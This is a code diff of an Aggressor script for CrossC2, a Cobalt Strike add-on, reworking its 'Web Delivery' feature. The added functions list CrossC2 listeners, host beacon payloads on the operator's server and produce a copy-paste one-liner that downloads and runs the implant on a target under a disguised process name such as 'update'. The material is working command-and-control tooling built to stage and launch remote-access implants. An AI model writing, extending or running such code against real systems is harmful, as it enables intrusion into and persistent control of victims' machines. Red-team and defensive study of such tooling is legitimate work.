@@ -41,6 +41,7 @@ popup ssh {
 
 sub random_string {
     # <3 @offsec_ginger
+    local('$limit @random_str $characters');
     $limit = $1;
     @random_str = @();
     $characters = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ";
@@ -52,6 +53,7 @@ sub random_string {
 }
 
 sub getSystemInfo {
+    local('$process $sys_data');
     $process = exec("/usr/bin/uname");
     $sys_data = readAll($process);
     closef($process);
@@ -63,6 +65,7 @@ sub getSystemInfo {
 }
 
 sub checkSpace {
+    local('$realPath');
     $realPath = "";
     if ($1 eq "null") {
         $realPath = $1;
@@ -167,6 +170,7 @@ sub createCrossC2ListenerDialogCallBack {
 }
 
 sub createCrossC2Listener {
+    local('$reverse_https_flag');
     $reverse_https_flag = $1;
     $dialog = dialog("CrossC2 Listener", %(lport => "55413", beaconKey => "./.cobaltstrike.beacon_keys", rebind_lib => "null", listener => "Listener: ", system => "System: ", arch => "Arch: ", payload_type => "Payload_Type: ", outputFileName => "/tmp/CrossC2-test", enableSSL => false, bindPort => "4444"), &createCrossC2ListenerDialogCallBack);
     dialog_description($dialog, "<style type=\"text/css\">.word{width: 100px;height: 30px;background: #E5E5E5;text-align: center;line-height: 30px;font-size: 14px;}</style><div class=\"word\">Export CrossC2 Payload<br><a href=\"https://github.com/gloxec/CrossC2\">https://github.com/gloxec/CrossC2</a></div>");
@@ -209,6 +213,7 @@ sub projectAbout {
 
 sub genDownloadPayload {
     # "python", "ruby", "pip", "php", "ksh"
+    local('$type $payloadContentURL $downloadURL');
     $type = $1;
     $payloadContentURL = $2;
     $downloadURL = "";
@@ -233,6 +238,7 @@ sub genDownloadPayload {
 }
 
 sub genDownloadPayloadContent {
+    local('$type $beaconUrl $payload $processName $targetSaveDir $targetSaveName $targetSavePath $type $payload');
     $type = $1;
     $beaconUrl = $2;
     $payload = "";
@@ -284,7 +290,59 @@ sub genDownloadPayloadContent {
     return $payload;
 }
 
+sub checkCrossC2BeaconSite {
+    local('$beacon_site_name $beaconURLMap $matchFlag');
+    $beacon_site_name = $1;
+    $matchFlag = "";
+    %beaconURLMap = getCrossC2Site();
+    foreach $key => $value (%beaconURLMap) {
+        if ($beacon_site_name isin $value) {
+            $matchFlag = $value[1];
+        }
+    }
+    return $matchFlag;
+}
+
+sub getCrossC2BeaconSiteURL {
+    local('$listener_name $beacon_site_name $listener $listener_padding $system_arch_padding $listener_name $system $arch');
+    $listener_name = $1;
+    $beacon_site_name = "";
+    $listener = $null;
+    if ("CrossC2 reverse HTTPS" isin $listener_name) {
+        $beacon_site_name = "CrossC2 beacon: reverse-https";
+        ($_, $listener_padding, $system_arch_padding) = split('\{ ', $listener_name);
+        ($listener, $_) = split(' \}', $listener_padding);
+        ($system, $arch, $_) = split(' ', $system_arch_padding);
+    } else {
+        $beacon_site_name = "CrossC2 beacon: bind-tcp";
+        ($_, $_, $_, $_, $system, $arch) = split(' ', $listener_name);
+    }
+    $beacon_site_name = $beacon_site_name.' '.$system.' '.$arch;
+    if ($listener) {
+        $beacon_site_name = $beacon_site_name.' { '.$listener.' }'
+    }
+    return $beacon_site_name;
+}
+
+sub createCrossC2BeaconSite {
+    local('$listener $beacon_site_name $lhost $lport $enableSSL $beaconData $targetSaveName $beaconUrl');
+    $listener = $1;
+    $beacon_site_name = $2;
+    $lhost = $3;
+    $lport = $4;
+    $enableSSL = $5;
+    $beaconData = listener_info($listener)['CrossC2Beacon'];
+    $targetSaveName = random_string(10);
+    if ($enableSSL eq 'true') {
+        $beaconUrl = site_host($lhost, $lport, "/".$targetSaveName, $beaconData, "automatic", $beacon_site_name.'[https]', true); 
+    } else {
+        $beaconUrl = site_host($lhost, $lport, "/".$targetSaveName, $beaconData, "automatic", $beacon_site_name.'[http]', false);
+    }
+    return $beaconUrl;
+}
+
 sub genCrossC2ScriptDialogCallback {
+    local('$uri $lhost $lport $type $enableSSL $processName $listener $needCheckBeaconSiteName $payloadContent $payloadContentURL $scriptUrl');
     $uri = $3['uri'];
     $lhost = $3['lhost'];
     $lport = $3['lport'];
@@ -293,10 +351,12 @@ sub genCrossC2ScriptDialogCallback {
     $enableSSL = $3['enableSSL'];
     $processName = $3['processname'];
     $listener = $3['listener'];
-    $listenerinfo = split('  ->  ', $listener);
-    $beaconUrl = $listenerinfo[1];
-
-    elog("select beacon listener url = $beaconUrl");
+    $needCheckBeaconSiteName = getCrossC2BeaconSiteURL($listener);
+    $beaconUrl = checkCrossC2BeaconSite($needCheckBeaconSiteName);
+    if ($beaconUrl eq "") {
+        $beaconUrl = createCrossC2BeaconSite($listener, $needCheckBeaconSiteName, $lhost, $lport, $enableSSL);
+    }
+    $listenerinfo = @($needCheckBeaconSiteName, $beaconUrl);
 
     # gen payloadContent
     $payloadContent = genDownloadPayloadContent($type, $beaconUrl, $processName);
@@ -311,13 +371,14 @@ sub genCrossC2ScriptDialogCallback {
     $scriptUrl = genDownloadPayload($type, $payloadContentURL);
     # add_to_clipboard($scriptUrl);
     prompt_text("Copy/Paste One-liner: ", $scriptUrl, {});
-    elog("CrossC2 script: " . $scriptUrl);
+    elog("");
+    elog("CrossC2 $type script: " . $scriptUrl);
 }
 
 sub getCrossC2Site {
+    local('%beacon_site $beacon_count $Description, $Proto, $Host, $Port, $URI');
     %beacon_site = %();
     $beacon_count = 0;
-    local('$Description, $Proto, $Host, $Port, $URI');
     foreach $site_list(sites()) {
         ($Description, $Proto, $Host, $Port, $URI) = values($site_list, @('Description', 'Proto', 'Host', 'Port', 'URI'));
         if ("CrossC2" isin $Description) {
@@ -330,14 +391,30 @@ sub getCrossC2Site {
     return %beacon_site;
 }
 
+sub getCrossC2Listener {
+    local('%beacon_listener $beacon_count');
+    %beacon_listener = %();
+    $beacon_count = 0;
+    foreach $listener(listeners_local()) {
+        if ("CrossC2" isin $listener) {
+            %beacon_listener[$beacon_count] = @($listener);
+            $beacon_count += 1;
+        }
+    }
+    return %beacon_listener;
+}
+
 sub createCrossC2Script {
-    %beaconURLMap = getCrossC2Site();
+    local('@beaconSiteMenu @beaconListenerMenu %beaconListenerMap');
+    @beaconSiteMenu = @();
     @beaconListenerMenu = @();
-    foreach $key => $value (%beaconURLMap) {
-        add(@beaconListenerMenu, $value[0].'  ->  '.$value[1]);
+
+    %beaconListenerMap = getCrossC2Listener();
+    foreach $key => $value (%beaconListenerMap) {
+        add(@beaconListenerMenu, $value[0]);
     }
 
-    $dialog = dialog("CrossC2 Web Delivery", %(uri => "/a", processname => "update", lhost => '0.0.0.0', lport => "55413", type => "curl", listener => "", enableSSL => false), &genCrossC2ScriptDialogCallback);
+    $dialog = dialog("CrossC2 Web Delivery", %(uri => "/a", processname => "update", lhost => localip(), lport => "55413", type => "curl", listener => "", enableSSL => false), &genCrossC2ScriptDialogCallback);
     dialog_description($dialog, "<style type=\"text/css\">.word{width: 100px;height: 30px;background: #E5E5E5;text-align: center;line-height: 30px;font-size: 14px;}</style><div class=\"word\">Export CrossC2 Payload<br><a href=\"https://github.com/gloxec/CrossC2\">https://github.com/gloxec/CrossC2</a></div>");
     drow_text($dialog, "uri", "URI Path: ", 20);
     drow_text($dialog, "processname", "ProcessName: ", 20);
